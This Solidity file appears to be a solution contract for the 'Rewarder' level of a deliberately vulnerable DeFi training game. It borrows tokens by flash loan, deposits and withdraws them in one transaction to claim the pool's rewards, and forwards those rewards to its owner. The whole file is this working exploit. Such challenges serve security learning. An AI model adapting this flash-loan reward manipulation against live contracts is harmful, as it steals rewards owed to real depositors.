// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

error TheRewarderSolver__NotOwner();

contract TheRewarderSolver {
    address private immutable i_owner;
    TheRewarderPool private immutable rewardPool;
    FlashLoanerPool private immutable flashPool;

    modifier ownerOnly() {
        if (msg.sender != i_owner) {
            revert TheRewarderSolver__NotOwner();
        }
        _;
    }

    constructor(address rewardPoolAddress, address flashPoolAddress) {
        i_owner = msg.sender;
        rewardPool = TheRewarderPool(rewardPoolAddress);
        flashPool = FlashLoanerPool(flashPoolAddress);
    }

    function attack(uint256 amount) external ownerOnly {
        flashPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        DamnValuableToken token = DamnValuableToken(rewardPool.liquidityToken());
        RewardToken rewardToken = RewardToken(rewardPool.rewardToken());

        token.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        token.transfer(address(flashPool), amount);
        rewardToken.transfer(i_owner, rewardToken.balanceOf(address(this)));
    }
}
